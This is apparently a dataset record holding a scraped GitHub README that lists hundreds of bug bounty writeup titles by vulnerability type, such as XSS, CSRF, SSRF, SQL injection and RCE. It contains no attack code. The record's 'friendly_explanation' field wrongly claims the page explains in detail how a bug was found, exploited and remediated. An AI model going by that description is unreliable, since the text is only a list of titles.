Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cross-site-scripting-xss", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cross-site-scripting-xss. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and 